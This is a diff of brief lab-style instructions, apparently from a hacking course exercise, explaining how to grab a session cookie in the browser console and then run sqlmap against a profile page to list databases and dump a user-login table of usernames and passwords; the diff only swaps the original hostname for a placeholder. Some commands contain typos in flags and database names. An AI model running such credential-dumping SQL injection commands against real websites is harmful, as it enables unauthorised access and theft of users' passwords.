@@ -1,7 +1,7 @@
 now in parrot os, open firefox and login into the website given and details.
 Go to profile and and right cleck and inspect and console type “document.cookie” you will get one value.
 Open the terminal and type the below commands to get the password of other user.
-sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=;" –-dbs
-sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moveiscope – -tables
-sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moviescope -T user-Login – -dump
+sqlmap -u "http://site/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=;" –-dbs
+sqlmap -u "http://site/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moveiscope – -tables
+sqlmap -u "http://site/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moviescope -T user-Login – -dump
 You will get all the Useraname and Passwords of the website.
